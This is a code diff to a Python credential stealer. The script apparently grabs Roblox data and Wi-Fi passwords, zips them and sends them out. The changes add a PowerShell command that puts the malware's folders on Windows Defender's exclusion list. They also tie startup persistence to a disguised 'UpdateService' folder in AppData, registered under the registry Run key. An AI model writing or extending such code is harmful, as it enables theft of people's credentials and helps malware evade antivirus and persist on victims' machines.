@@ -1,4 +1,4 @@
-import os, re, requests, subprocess, random, time, shutil, zipfile, sys, sqlite3, json, base64, ctypes, Cryptodome.Cipher.AES
+import os, re, requests, subprocess, random, time, shutil, zipfile, sys, sqlite3, json, base64, ctypes, Cryptodome.Cipher.AES, win32com
 from threading import Thread
 import win32crypt
 
@@ -64,7 +64,7 @@ class main():
 		self.writeRoblox()
 		self.grabwifi()
 
-		if config["Startup"]: self.startup()
+		if config["Startup"] and sys.argv[0] == f"C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\UpdateService\{self.filename}": self.startup()
 
 		self.zipup()
 		self.send()
@@ -118,6 +118,7 @@ class main():
 		try: self.system("powershell Get-Itemproperty -path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name UpdateService")
 		except:
 			shutil.copytree(os.getcwd(), f'C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/UpdateService')
+			self.system(fr"powershell cd C:\; Set-MpPreference -ExclusionPath C:\Users{os.getlogin()}\Appdata\Microsoft\UpdateService, {os.getcwd()}")
 			self.system(fr"powershell New-Itemproperty -path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'UpdateService' -value 'C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\UpdateService\{self.filename} -silent' -PropertyType STRING")
 		
 
